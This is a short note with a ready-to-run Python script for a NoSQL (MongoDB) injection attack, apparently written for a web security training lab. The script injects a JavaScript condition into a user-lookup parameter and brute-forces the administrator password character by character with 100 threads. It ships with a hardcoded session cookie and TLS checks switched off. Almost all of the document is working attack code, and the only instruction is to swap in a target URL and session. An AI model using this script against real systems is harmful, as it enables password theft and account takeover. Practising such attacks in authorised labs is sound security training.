# NoSQL Data Exfiltration - MultiThreading

***NoSQL Data Exfiltration- MultiThreading***

Must Change Variables - `URL / Session` 

MongoDB Database

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def multiThreading():
    
    ts = time.perf_counter()
    session = requests.Session()
    
    url = "https://0a4000e804cf8653836346f100bc00c6.web-security-academy.net"
    cookies = {
        'session': 'Xk5syI9H0BsPcNnuMyOxiSnKHojYDxrH'
    }

    chars = string.digits + string.ascii_letters
    index = list(range(0,10))
    password = ""

    def Threads(wordlist):
        for char in chars:
            req = session.get(
            f"{url}/user/lookup?user=administrator'+%26%26+this.password[{wordlist}]+%3d%3d+'{char}'+||+'a'%3d%3d'b",
            cookies=cookies,
            verify=False,
        )
            if "Could not find user" not in req.text:
                return char
        return ""

    with ThreadPoolExecutor(max_workers=100) as executor:
        processes = executor.map(Threads,index)

    
    password = ''.join(processes)

    te = time.perf_counter()

    print(f"[+] Password extracted: {password}")
    print(f"[+] Time taken: {te - ts:.2f} seconds")

multiThreading()
```